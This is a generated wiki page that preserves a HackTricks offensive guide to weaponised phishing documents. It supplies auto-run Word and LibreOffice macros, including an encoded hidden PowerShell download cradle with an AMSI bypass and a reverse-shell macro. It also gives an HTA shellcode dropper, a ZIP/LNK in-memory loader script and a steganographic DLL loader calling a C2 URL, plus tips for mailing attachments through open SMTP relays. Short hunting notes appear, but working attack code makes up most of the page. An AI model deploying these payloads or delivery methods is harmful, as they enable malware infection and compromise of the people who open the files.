---
parsed_by: focuslocust
source: hacktricks
type: generated
---
# Phishing Files & Documents

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `hacktricks` |
| Type | `hacktricks-topic` |
| Record ID | `hacktricks-generic-methodologies-and-resources-phishing-methodology-phishing-documents` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Phishing Files & Documents](../../topics/generic-methodologies-and-resources/phishing-files-and-documents.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | hacktricks-generic-methodologies-and-resources-phishing-methodology-phishing-documents |
| name | Phishing Files & Documents |
| type | hacktricks-topic |
| source | hacktricks |
| url | https://github.com/HackTricks-wiki/hacktricks/blob/master/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md |

## Preserved Source Material

````yaml
_body: "# Phishing Files & Documents\n\n{{#include ../../banners/hacktricks-training.md}}\n\n## Office Documents\n\nMicrosoft\
  \ Word performs file data validation before opening a file. Data validation is performed in the form of data structure identification,\
  \ against the OfficeOpenXML standard. If any error occurs during the data structure identification, the file being analysed\
  \ will not be opened.\n\nUsually, Word files containing macros use the `.docm` extension. However, it's possible to rename\
  \ the file by changing the file extension and still keep their macro executing capabilities.\\\nFor example, an RTF file\
  \ does not support macros, by design, but a DOCM file renamed to RTF will be handled by Microsoft Word and will be capable\
  \ of macro execution.\\\nThe same internals and mechanisms apply to all software of the Microsoft Office Suite (Excel, PowerPoint\
  \ etc.).\n\nYou can use the following command to check which extensions are going to be executed by some Office programs:\n\
  \n```bash\nassoc | findstr /i \"word excel powerp\"\n```\n\nDOCX files referencing a remote template (File –Options –Add-ins\
  \ –Manage: Templates –Go) that includes macros can “execute” macros as well.\n\n### External Image Load\n\nGo to: _Insert\
  \ --> Quick Parts --> Field_\\\n_**Categories**: Links and References, **Filed names**: includePicture, and **Filename or\
  \ URL**:_ http://<ip>/whatever\n\n![](<../../images/image (155).png>)\n\n### Macros Backdoor\n\nIt's possible to use macros\
  \ to run arbitrary code from the document.\n\n#### Autoload functions\n\nThe more common they are, the more probable the\
  \ AV will detect them.\n\n- AutoOpen()\n- Document_Open()\n\n#### Macros Code Examples\n\n```vba\nSub AutoOpen()\n    CreateObject(\"\
  WScript.Shell\").Exec (\"powershell.exe -nop -Windowstyle hidden -ep bypass -enc JABhACAAPQAgACcAUwB5AHMAdABlAG0ALgBNAGEAbgBhAGcAZQBtAGUAbgB0AC4AQQB1AHQAbwBtAGEAdABpAG8AbgAuAEEAJwA7ACQAYgAgAD0AIAAnAG0AcwAnADsAJAB1ACAAPQAgACcAVQB0AGkAbABzACcACgAkAGEAcwBzAGUAbQBiAGwAeQAgAD0AIABbAFIAZQBmAF0ALgBBAHMAcwBlAG0AYgBsAHkALgBHAGUAdABUAHkAcABlACgAKAAnAHsAMAB9AHsAMQB9AGkAewAyAH0AJwAgAC0AZgAgACQAYQAsACQAYgAsACQAdQApACkAOwAKACQAZgBpAGUAbABkACAAPQAgACQAYQBzAHMAZQBtAGIAbAB5AC4ARwBlAHQARgBpAGUAbABkACgAKAAnAGEAewAwAH0AaQBJAG4AaQB0AEYAYQBpAGwAZQBkACcAIAAtAGYAIAAkAGIAKQAsACcATgBvAG4AUAB1AGIAbABpAGMALABTAHQAYQB0AGkAYwAnACkAOwAKACQAZgBpAGUAbABkAC4AUwBlAHQAVgBhAGwAdQBlACgAJABuAHUAbABsACwAJAB0AHIAdQBlACkAOwAKAEkARQBYACgATgBlAHcALQBPAGIAagBlAGMAdAAgAE4AZQB0AC4AVwBlAGIAQwBsAGkAZQBuAHQAKQAuAGQAbwB3AG4AbABvAGEAZABTAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAwAC4AMQAxAC8AaQBwAHMALgBwAHMAMQAnACkACgA=\"\
  )\nEnd Sub\n```\n\n```vba\nSub AutoOpen()\n\n  Dim Shell As Object\n  Set Shell = CreateObject(\"wscript.shell\")\n  Shell.Run\
  \ \"calc\"\n\nEnd Sub\n```\n\n```vba\nDim author As String\nauthor = oWB.BuiltinDocumentProperties(\"Author\")\nWith objWshell1.Exec(\"\
  powershell.exe -nop -Windowsstyle hidden -Command-\")\n .StdIn.WriteLine author\n .StdIn.WriteBlackLines 1\n```\n\n```vba\n\
  Dim proc As Object\nSet proc = GetObject(\"winmgmts:\\\\.\\root\\cimv2:Win32_Process\")\nproc.Create \"powershell <beacon\
  \ line generated>\n```\n\n#### Manually remove metadata\n\nFo to **File > Info > Inspect Document > Inspect Document**,\
  \ which will bring up the Document Inspector. Click **Inspect** and then **Remove All** next to **Document Properties and\
  \ Personal Information**.\n\n#### Doc Extension\n\nWhen finished, select **Save as type** dropdown, change the format from\
  \ **`.docx`** to **Word 97-2003 `.doc`**.\\\nDo this because you **can't save macro's inside a `.docx`** and there's a **stigma**\
  \ **around** the macro-enabled **`.docm`** extension (e.g. the thumbnail icon has a huge `!` and some web/email gateway\
  \ block them entirely). Therefore, this **legacy `.doc` extension is the best compromise**.\n\n#### Malicious Macros Generators\n\
  \n- MacOS\n  - [**macphish**](https://github.com/cldrn/macphish)\n  - [**Mythic Macro Generator**](https://github.com/cedowens/Mythic-Macro-Generator)\n\
  \n## LibreOffice ODT auto-run macros (Basic)\n\nLibreOffice Writer documents can embed Basic macros and auto-execute them\
  \ when the file is opened by binding the macro to the **Open Document** event (Tools → Customize → Events → Open Document\
  \ → Macro…). A simple reverse shell macro looks like:\n\n```vb\nSub Shell\n    Shell(\"cmd /c powershell -enc BASE64_PAYLOAD\"\
  \"\"\")\nEnd Sub\n```\n\nNote the doubled quotes (`\"\"`) inside the string – LibreOffice Basic uses them to escape literal\
  \ quotes, so payloads that end with `...==\"\"\")` keep both the inner command and the Shell argument balanced.\n\nDelivery\
  \ tips:\n\n- Save as `.odt` and bind the macro to the document event so it fires immediately when opened.\n- When emailing\
  \ with `swaks`, use `--attach @resume.odt` (the `@` is required so the file bytes, not the filename string, are sent as\
  \ the attachment). This is critical when abusing SMTP servers that accept arbitrary `RCPT TO` recipients without validation.\n\
  \n## HTA Files\n\nAn HTA is a Windows program that **combines HTML and scripting languages (such as VBScript and JScript)**.\
  \ It generates the user interface and executes as a \"fully trusted\" application, without the constraints of a browser's\
  \ security model.\n\nAn HTA is executed using **`mshta.exe`**, which is typically **installed** along with **Internet Explorer**,\
  \ making **`mshta` dependant on IE**. So if it has been uninstalled, HTAs will be unable to execute.\n\n```html\n<--! Basic\
  \ HTA Execution -->\n<html>\n  <head>\n    <title>Hello World</title>\n  </head>\n  <body>\n    <h2>Hello World</h2>\n \
  \   <p>This is an HTA...</p>\n  </body>\n\n  <script language=\"VBScript\">\n    Function Pwn()\n      Set shell = CreateObject(\"\
  wscript.Shell\")\n      shell.run \"calc\"\n    End Function\n\n    Pwn\n  </script>\n</html>\n```\n\n```html\n<--! Cobal\
  \ Strike generated HTA without shellcode -->\n<script language=\"VBScript\">\n  Function var_func()\n  \tvar_shellcode =\
  \ \"<shellcode>\"\n\n  \tDim var_obj\n  \tSet var_obj = CreateObject(\"Scripting.FileSystemObject\")\n  \tDim var_stream\n\
  \  \tDim var_tempdir\n  \tDim var_tempexe\n  \tDim var_basedir\n  \tSet var_tempdir = var_obj.GetSpecialFolder(2)\n  \t\
  var_basedir = var_tempdir & \"\\\" & var_obj.GetTempName()\n  \tvar_obj.CreateFolder(var_basedir)\n  \tvar_tempexe = var_basedir\
  \ & \"\\\" & \"evil.exe\"\n  \tSet var_stream = var_obj.CreateTextFile(var_tempexe, true , false)\n  \tFor i = 1 to Len(var_shellcode)\
  \ Step 2\n  \t    var_stream.Write Chr(CLng(\"&H\" & Mid(var_shellcode,i,2)))\n  \tNext\n  \tvar_stream.Close\n  \tDim var_shell\n\
  \  \tSet var_shell = CreateObject(\"Wscript.Shell\")\n  \tvar_shell.run var_tempexe, 0, true\n  \tvar_obj.DeleteFile(var_tempexe)\n\
  \  \tvar_obj.DeleteFolder(var_basedir)\n  End Function\n\n  var_func\n  self.close\n</script>\n```\n\n## Forcing NTLM Authentication\n\
  \nThere are several ways to **force NTLM authentication \"remotely\"**, for example, you could add **invisible images**\
  \ to emails or HTML that the user will access (even HTTP MitM?). Or send the victim the **address of files** that will **trigger**\
  \ an **authentication** just for **opening the folder.**\n\n**Check these ideas and more in the following pages:**\n\n\n\
  {{#ref}}\n../../windows-hardening/active-directory-methodology/printers-spooler-service-abuse.md\n{{#endref}}\n\n\n{{#ref}}\n\
  ../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md\n{{#endref}}\n\n### NTLM Relay\n\nDon't forget that you cannot\
  \ only steal the hash or the authentication but also **perform NTLM relay attacks**:\n\n- [**NTLM Relay attacks**](../pentesting-network/spoofing-llmnr-nbt-ns-mdns-dns-and-wpad-and-relay-attacks.md#ntml-relay-attack)\n\
  - [**AD CS ESC8 (NTLM relay to certificates)**](../../windows-hardening/active-directory-methodology/ad-certificates/domain-escalation.md#ntlm-relay-to-ad-cs-http-endpoints-esc8)\n\
  \n## LNK Loaders + ZIP-Embedded Payloads (fileless chain)\n\nHighly effective campaigns deliver a ZIP that contains two\
  \ legitimate decoy documents (PDF/DOCX) and a malicious .lnk. The trick is that the actual PowerShell loader is stored inside\
  \ the ZIP’s raw bytes after a unique marker, and the .lnk carves and runs it fully in memory.\n\nTypical flow implemented\
  \ by the .lnk PowerShell one-liner:\n\n1) Locate the original ZIP in common paths: Desktop, Downloads, Documents, %TEMP%,\
  \ %ProgramData%, and the parent of the current working directory.\n2) Read the ZIP bytes and find a hardcoded marker (e.g.,\
  \ xFIQCV). Everything after the marker is the embedded PowerShell payload.\n3) Copy the ZIP to %ProgramData%, extract there,\
  \ and open the decoy .docx to appear legitimate.\n4) Bypass AMSI for the current process: [System.Management.Automation.AmsiUtils]::amsiInitFailed\
  \ = $true\n5) Deobfuscate the next stage (e.g., remove all # characters) and execute it in memory.\n\nExample PowerShell\
  \ skeleton to carve and run the embedded stage:\n\n```powershell\n$marker   = [Text.Encoding]::ASCII.GetBytes('xFIQCV')\n\
  $paths    = @(\n  \"$env:USERPROFILE\\Desktop\", \"$env:USERPROFILE\\Downloads\", \"$env:USERPROFILE\\Documents\",\n  \"\
  $env:TEMP\", \"$env:ProgramData\", (Get-Location).Path, (Get-Item '..').FullName\n)\n$zip = Get-ChildItem -Path $paths -Filter\
  \ *.zip -ErrorAction SilentlyContinue -Recurse | Sort-Object LastWriteTime -Descending | Select-Object -First 1\nif(-not\
  \ $zip){ return }\n$bytes = [IO.File]::ReadAllBytes($zip.FullName)\n$idx   = [System.MemoryExtensions]::IndexOf($bytes,\
  \ $marker)\nif($idx -lt 0){ return }\n$stage = $bytes[($idx + $marker.Length) .. ($bytes.Length-1)]\n$code  = [Text.Encoding]::UTF8.GetString($stage)\
  \ -replace '#',''\n[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)\n\
  Invoke-Expression $code\n```\n\nNotes\n- Delivery often abuses reputable PaaS subdomains (e.g., *.herokuapp.com) and may\
  \ gate payloads (serve benign ZIPs based on IP/UA).\n- The next stage frequently decrypts base64/XOR shellcode and executes\
  \ it via Reflection.Emit + VirtualAlloc to minimize disk artifacts.\n\nPersistence used in the same chain\n- COM TypeLib\
  \ hijacking of the Microsoft Web Browser control so that IE/Explorer or any app embedding it re-launches the payload automatically.\
  \ See details and ready-to-use commands here:\n\n{{#ref}}\n../../windows-hardening/windows-local-privilege-escalation/com-hijacking.md\n\
  {{#endref}}\n\nHunting/IOCs\n- ZIP files containing the ASCII marker string (e.g., xFIQCV) appended to the archive data.\n\
  - .lnk that enumerates parent/user folders to locate the ZIP and opens a decoy document.\n- AMSI tampering via [System.Management.Automation.AmsiUtils]::amsiInitFailed.\n\
  - Long-running business threads ending with links hosted under trusted PaaS domains.\n\n## Steganography-delimited payloads\
  \ in images (PowerShell stager)\n\nRecent loader chains deliver an obfuscated JavaScript/VBS that decodes and runs a Base64\
  \ PowerShell stager. That stager downloads an image (often GIF) that contains a Base64-encoded .NET DLL hidden as plain\
  \ text between unique start/end markers. The script searches for these delimiters (examples seen in the wild: «<<sudo_png>>\
  \ … <<sudo_odt>>>»), extracts the between-text, Base64-decodes it to bytes, loads the assembly in-memory and invokes a known\
  \ entry method with the C2 URL.\n\nWorkflow\n- Stage 1: Archived JS/VBS dropper → decodes embedded Base64 → launches PowerShell\
  \ stager with -nop -w hidden -ep bypass.\n- Stage 2: PowerShell stager → downloads image, carves marker-delimited Base64,\
  \ loads the .NET DLL in-memory and calls its method (e.g., VAI) passing the C2 URL and options.\n- Stage 3: Loader retrieves\
  \ final payload and typically injects it via process hollowing into a trusted binary (commonly MSBuild.exe). See more about\
  \ process hollowing and trusted utility proxy execution here:\n\n{{#ref}}\n../../reversing/common-api-used-in-malware.md\n\
  {{#endref}}\n\nPowerShell example to carve a DLL from an image and invoke a .NET method in-memory:\n\n<details>\n<summary>PowerShell\
  \ stego payload extractor and loader</summary>\n\n```powershell\n# Download the carrier image and extract a Base64 DLL between\
  \ custom markers, then load and invoke it in-memory\nparam(\n  [string]$Url    = 'https://example.com/payload.gif',\n  [string]$StartM\
  \ = '<<sudo_png>>',\n  [string]$EndM   = '<<sudo_odt>>',\n  [string]$EntryType = 'Loader',\n  [string]$EntryMeth = 'VAI',\n\
  \  [string]$C2    = 'https://c2.example/payload'\n)\n$img = (New-Object Net.WebClient).DownloadString($Url)\n$start = $img.IndexOf($StartM)\n\
  $end   = $img.IndexOf($EndM)\nif($start -lt 0 -or $end -lt 0 -or $end -le $start){ throw 'markers not found' }\n$b64 = $img.Substring($start\
  \ + $StartM.Length, $end - ($start + $StartM.Length))\n$bytes = [Convert]::FromBase64String($b64)\n$asm = [Reflection.Assembly]::Load($bytes)\n\
  $type = $asm.GetType($EntryType)\n$method = $type.GetMethod($EntryMeth, [Reflection.BindingFlags] 'Public,Static,NonPublic')\n\
  $null = $method.Invoke($null, @($C2, $env:PROCESSOR_ARCHITECTURE))\n```\n\n</details>\n\nNotes\n- This is ATT&CK T1027.003\
  \ (steganography/marker-hiding). Markers vary between campaigns.\n- AMSI/ETW bypass and string deobfuscation are commonly\
  \ applied before loading the assembly.\n- Hunting: scan downloaded images for known delimiters; identify PowerShell accessing\
  \ images and immediately decoding Base64 blobs.\n\nSee also stego tools and carving techniques:\n\n{{#ref}}\n../../stego/workflow/README.md#quick-triage-checklist-first-10-minutes\n\
  {{#endref}}\n\n## JS/VBS droppers → Base64 PowerShell staging\n\nA recurring initial stage is a small, heavily‑obfuscated\
  \ `.js` or `.vbs` delivered inside an archive. Its sole purpose is to decode an embedded Base64 string and launch PowerShell\
  \ with `-nop -w hidden -ep bypass` to bootstrap the next stage over HTTPS.\n\nSkeleton logic (abstract):\n- Read own file\
  \ contents\n- Locate a Base64 blob between junk strings\n- Decode to ASCII PowerShell\n- Execute with `wscript.exe`/`cscript.exe`\
  \ invoking `powershell.exe`\n\nHunting cues\n- Archived JS/VBS attachments spawning `powershell.exe` with `-enc`/`FromBase64String`\
  \ in the command line.\n- `wscript.exe` launching `powershell.exe -nop -w hidden` from user temp paths.\n\n## Windows files\
  \ to steal NTLM hashes\n\nCheck the page about **places to steal NTLM creds**:\n\n{{#ref}}\n../../windows-hardening/ntlm/places-to-steal-ntlm-creds.md\n\
  {{#endref}}\n\n\n## References\n\n- [HTB Job – LibreOffice macro → IIS webshell → GodPotato](https://0xdf.gitlab.io/2026/01/26/htb-job.html)\n\
  - [Check Point Research – ZipLine Campaign: A Sophisticated Phishing Attack Targeting US Companies](https://research.checkpoint.com/2025/zipline-phishing-campaign/)\n\
  - [Hijack the TypeLib – New COM persistence technique (CICADA8)](https://cicada-8.medium.com/hijack-the-typelib-new-com-persistence-technique-32ae1d284661)\n\
  - [Unit 42 – PhantomVAI Loader Delivers a Range of Infostealers](https://unit42.paloaltonetworks.com/phantomvai-loader-delivers-infostealers/)\n\
  - [MITRE ATT&CK – Steganography (T1027.003)](https://attack.mitre.org/techniques/T1027/003/)\n- [MITRE ATT&CK – Process\
  \ Hollowing (T1055.012)](https://attack.mitre.org/techniques/T1055/012/)\n- [MITRE ATT&CK – Trusted Developer Utilities\
  \ Proxy Execution: MSBuild (T1127.001)](https://attack.mitre.org/techniques/T1127/001/)\n\n{{#include ../../banners/hacktricks-training.md}}"
_relative_path: generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
_source_path: /home/adams/scorchederf/focuslocust/.cache/hacktricks/src/generic-methodologies-and-resources/phishing-methodology/phishing-documents.md
````
